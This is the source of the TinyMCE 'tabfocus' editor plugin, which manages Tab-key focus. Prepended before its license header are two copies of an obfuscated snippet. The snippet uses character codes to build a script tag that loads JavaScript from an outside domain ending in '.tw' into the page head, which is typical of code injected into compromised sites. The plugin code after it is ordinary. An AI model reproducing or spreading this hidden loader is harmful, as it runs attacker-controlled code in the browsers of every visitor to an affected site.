Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * editor_plugin_src.js
 *
 * Copyright 2009, Moxiecode Systems AB
 * Released under LGPL License.
 *
 * License: http://tinymce.moxiecode.com/license
 * Contributing: http://tinymce.moxiecode.com/contributing
 */

(function() {
	var DOM = tinymce.DOM, Event = tinymce.dom.Event, each = tinymce.each, explode = tinymce.explode;

	tinymce.create('tinymce.plugins.TabFocusPlugin', {
		init : function(ed, url) {
			function tabCancel(ed, e) {
				if (e.keyCode === 9)
					return Event.cancel(e);
			}

			function tabHandler(ed, e) {
				var x, i, f, el, v;

				function find(d) {
					el = DOM.select(':input:enabled,*[tabindex]:not(iframe)');

					function canSelectRecursive(e) {
						return e.nodeName==="BODY" || (e.type != 'hidden' &&
							!(e.style.display == "none") &&
							!(e.style.visibility == "hidden") && canSelectRecursive(e.parentNode));
					}
					function canSelectInOldIe(el) {
						return el.attributes["tabIndex"].specified || el.nodeName == "INPUT" || el.nodeName == "TEXTAREA";
					}
					function isOldIe() {
						return tinymce.isIE6 || tinymce.isIE7;
					}
					function canSelect(el) {
						return ((!isOldIe() || canSelectInOldIe(el))) && el.getAttribute("tabindex") != '-1' && canSelectRecursive(el);
					}

					each(el, function(e, i) {
						if (e.id == ed.id) {
							x = i;
							return false;
						}
					});
					if (d > 0) {
						for (i = x + 1; i < el.length; i++) {
							if (canSelect(el[i]))
								return el[i];
						}
					} else {
						for (i = x - 1; i >= 0; i--) {
							if (canSelect(el[i]))
								return el[i];
						}
					}

					return null;
				}

				if (e.keyCode === 9) {
					v = explode(ed.getParam('tab_focus', ed.getParam('tabfocus_elements', ':prev,:next')));

					if (v.length == 1) {
						v[1] = v[0];
						v[0] = ':prev';
					}

					// Find element to focus
					if (e.shiftKey) {
						if (v[0] == ':prev')
							el = find(-1);
						else
							el = DOM.get(v[0]);
					} else {
						if (v[1] == ':next')
							el = find(1);
						else
							el = DOM.get(v[1]);
					}

					if (el) {
						if (el.id && (ed = tinymce.get(el.id || el.name)))
							ed.focus();
						else
							window.setTimeout(function() {
								if (!tinymce.isWebKit)
									window.focus();
								el.focus();
							}, 10);

						return Event.cancel(e);
					}
				}
			}

			ed.onKeyUp.add(tabCancel);

			if (tinymce.isGecko) {
				ed.onKeyPress.add(tabHandler);
				ed.onKeyDown.add(tabCancel);
			} else
				ed.onKeyDown.add(tabHandler);

		},

		getInfo : function() {
			return {
				longname : 'Tabfocus',
				author : 'Moxiecode Systems AB',
				authorurl : 'http://tinymce.moxiecode.com',
				infourl : 'http://wiki.moxiecode.com/index.php/TinyMCE:Plugins/tabfocus',
				version : tinymce.majorVersion + "." + tinymce.minorVersion
			};
		}
	});

	// Register plugin
	tinymce.PluginManager.add('tabfocus', tinymce.plugins.TabFocusPlugin);
})();
